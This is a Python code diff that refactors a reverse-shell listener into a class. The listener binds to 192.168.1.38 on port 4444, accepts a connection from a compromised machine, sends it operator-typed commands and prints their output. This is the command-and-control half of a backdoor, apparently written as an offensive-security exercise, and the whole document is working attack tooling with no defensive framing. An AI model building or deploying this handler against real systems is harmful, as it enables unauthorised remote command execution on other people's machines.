@@ -2,16 +2,28 @@
 
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("192.168.1.38", 4444))
-listener.listen(0)  # specifying a backlog
-print("[+] Waiting for connection")
-connection, address = listener.accept()
-print("[+] Got a connection from" + str(address))
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)  # specifying a backlog
+        print("[+] Waiting for connection")
+        self.connection, address = listener.accept()
+        print("[+] Got a connection from" + str(address))
 
-while True:
-    command = input(">> ").encode()
-    connection.send(command)
-    result = connection.recv(1024)
-    print(result)
+    def execute_remotely(self, command):
+        self.connection.send(command)
+        return self.connection.recv(1024)
+
+
+    def run(self):
+        while True:
+            command = input(">> ").encode()
+            result = self.execute_remotely(command)
+            print(result)
+
+
+
+my_listener = Listener("192.168.1.38", 4444)
+my_listener.run()
